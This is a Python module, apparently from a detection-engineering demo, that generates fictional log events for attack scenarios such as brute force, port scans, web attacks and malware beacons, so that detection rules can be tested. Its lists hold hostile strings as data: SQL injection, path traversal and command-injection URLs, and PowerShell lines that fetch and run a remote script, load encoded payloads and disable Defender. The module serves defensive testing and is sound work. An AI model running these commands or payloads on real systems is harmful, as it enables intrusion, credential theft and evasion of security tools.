"""Attack scenarios.

Each scenario returns a list of raw events that, once ingested, should trigger
a specific detection. They are the demo script for the project: every scenario
here has a matching entry in docs/demo-scenarios.md and a matching detection
rule with a test.

Nothing in this module performs an attack. It writes log records describing a
fictional one.
"""

from __future__ import annotations

import random
from collections.abc import Callable
from datetime import datetime, timedelta, timezone

from generator import events, world

# Request strings that a web attack would leave in a proxy log. They are
# recorded as text and matched by a regex; they are never executed, parsed as
# SQL, or sent anywhere.
HOSTILE_URLS = [
    "/products?id=1'%20UNION%20SELECT%20username,password%20FROM%20users--",
    "/login?next=/admin&user=admin'%20OR%20'1'='1",
    "/download?file=../../../../etc/passwd",
    "/api/export?path=..%2f..%2f..%2fetc%2fshadow",
    "/tools/ping?host=127.0.0.1;cat%20/etc/passwd",
    "/search?q=%3Cscript%3Ealert(document.domain)%3C/script%3E",
    "/view?tpl=php://filter/convert.base64-encode/resource=config",
    "/report?id=1%20AND%20SLEEP(5)",
]

# Command lines characteristic of hostile PowerShell use, as they would appear
# in endpoint telemetry.
HOSTILE_POWERSHELL = [
    "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
    "powershell -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.66/s.ps1')\"",
    "powershell.exe -nop -w hidden -c \"[System.Reflection.Assembly]::Load([Convert]::FromBase64String($env:p))\"",
    "powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
]

ScenarioFn = Callable[[random.Random], list[dict]]


def brute_force(rng: random.Random) -> list[dict]:
    """Sustained failed authentication from one hostile address. -> T1110"""
    src = events.external_ip(rng, hostile=True)
    target = rng.choice(world.USERS)
    start = datetime.now(timezone.utc) - timedelta(minutes=2)
    return [
        events.auth_failure(rng, target, src_ip=src, at=start + timedelta(seconds=i * 6))
        for i in range(rng.randint(12, 20))
    ]


def password_spray(rng: random.Random) -> list[dict]:
    """One source, many accounts, few attempts each. -> T1110"""
    src = events.external_ip(rng, hostile=True)
    start = datetime.now(timezone.utc) - timedelta(minutes=3)
    targets = rng.sample(world.USERS, k=min(8, len(world.USERS)))
    return [
        events.auth_failure(rng, user, src_ip=src, at=start + timedelta(seconds=i * 12))
        for i, user in enumerate(targets * 2)
    ]


def credential_compromise(rng: random.Random) -> list[dict]:
    """Failures then a success from the same address. -> T1110 then T1078"""
    src = events.external_ip(rng, hostile=True)
    target = rng.choice(world.USERS)
    start = datetime.now(timezone.utc) - timedelta(minutes=4)
    batch = [
        events.auth_failure(rng, target, src_ip=src, at=start + timedelta(seconds=i * 8))
        for i in range(rng.randint(9, 14))
    ]
    batch.append(
        events.auth_success(
            rng, target, src_ip=src,
            location=rng.choice(world.FOREIGN_LOCATIONS),
            at=datetime.now(timezone.utc) - timedelta(seconds=10),
        )
    )
    return batch


def port_scan(rng: random.Random) -> list[dict]:
    """Vertical sweep across many ports on one host. -> T1046"""
    src = events.external_ip(rng, hostile=True)
    target = f"10.20.0.{rng.randint(10, 60)}"
    start = datetime.now(timezone.utc) - timedelta(minutes=1)
    ports = rng.sample(range(20, 9000), k=rng.randint(25, 45))
    return [
        events.network_connection(
            rng, src_ip=src, dst_ip=target, dst_port=port, action="deny",
            at=start + timedelta(milliseconds=i * 900),
        )
        for i, port in enumerate(ports)
    ]


def network_sweep(rng: random.Random) -> list[dict]:
    """Horizontal sweep of one port across many hosts. -> T1046"""
    src = events.external_ip(rng, hostile=True)
    port = rng.choice([445, 3389, 22])
    start = datetime.now(timezone.utc) - timedelta(minutes=1)
    return [
        events.network_connection(
            rng, src_ip=src, dst_ip=f"10.20.0.{host}", dst_port=port, action="deny",
            at=start + timedelta(milliseconds=i * 700),
        )
        for i, host in enumerate(range(10, 10 + rng.randint(14, 25)))
    ]


def web_attack(rng: random.Random) -> list[dict]:
    """Systematic probing with injection and traversal payloads. -> T1190"""
    src = events.external_ip(rng, hostile=True)
    start = datetime.now(timezone.utc) - timedelta(minutes=2)
    chosen = rng.sample(HOSTILE_URLS, k=rng.randint(4, len(HOSTILE_URLS)))
    return [
        events.http_request(
            rng, url=url, src_ip=src, status=rng.choice([200, 403, 500]),
            at=start + timedelta(seconds=i * 7),
        )
        for i, url in enumerate(chosen)
    ]


def impossible_travel(rng: random.Random) -> list[dict]:
    """Same account, two continents, minutes apart. -> T1078"""
    target = rng.choice(world.USERS)
    home = rng.choice(world.HOME_LOCATIONS)
    away = rng.choice(world.FOREIGN_LOCATIONS)
    now = datetime.now(timezone.utc)
    return [
        events.auth_success(
            rng, target, location=home, src_ip=events.internal_ip(rng),
            at=now - timedelta(minutes=rng.randint(20, 50)),
        ),
        events.auth_success(
            rng, target, location=away,
            src_ip=events.external_ip(rng, hostile=True),
            at=now - timedelta(seconds=20),
        ),
    ]


def suspicious_powershell(rng: random.Random) -> list[dict]:
    """Hostile PowerShell on a workstation. -> T1059.001"""
    host = rng.choice(world.WORKSTATIONS)
    user = rng.choice(world.USERS)
    return [
        events.process_execution(
            rng, process="powershell.exe", command=rng.choice(HOSTILE_POWERSHELL),
            hostname=host, username=user,
        )
    ]


def malware_execution(rng: random.Random) -> list[dict]:
    """A watchlisted hash executes, then beacons out. -> T1204.002"""
    host = rng.choice(world.WORKSTATIONS)
    user = rng.choice(world.USERS)
    digest = rng.choice(world.MALICIOUS_HASHES)
    return [
        events.process_execution(
            rng, process="svch0st.exe",
            command="C:\\Users\\Public\\svch0st.exe -install",
            hostname=host, username=user, file_hash=digest,
        ),
        events.dns_query(rng, domain=rng.choice(world.SUSPICIOUS_DOMAINS)),
        events.network_connection(rng, dst_ip="203.0.113.66", dst_port=443),
    ]


def privilege_escalation(rng: random.Random) -> list[dict]:
    """An account is added to a privileged group. -> T1548"""
    return [
        events.privilege_change(
            rng,
            username=rng.choice(world.USERS),
            group=rng.choice(world.PRIVILEGED_GROUPS),
            hostname=rng.choice(["SRV-DC-01", "SRV-DC-02"]),
        )
    ]


SCENARIOS: dict[str, ScenarioFn] = {
    "brute_force": brute_force,
    "password_spray": password_spray,
    "credential_compromise": credential_compromise,
    "port_scan": port_scan,
    "network_sweep": network_sweep,
    "web_attack": web_attack,
    "impossible_travel": impossible_travel,
    "suspicious_powershell": suspicious_powershell,
    "malware_execution": malware_execution,
    "privilege_escalation": privilege_escalation,
}


def benign_batch(rng: random.Random, count: int) -> list[dict]:
    """Ordinary activity.

    Weighted so the mix resembles a real environment: mostly network and DNS
    noise, a steady trickle of authentication, and the occasional failed login
    from a genuine typo — which is what makes the brute-force threshold
    meaningful rather than trivially satisfied.
    """
    builders = (
        [events.network_connection] * 8
        + [events.dns_query] * 6
        + [events.http_request] * 6
        + [events.auth_success] * 4
        + [events.process_execution] * 4
        + [events.file_access] * 3
        + [events.system_event] * 2
        + [events.auth_failure] * 1
    )
    return [rng.choice(builders)(rng) for _ in range(count)]
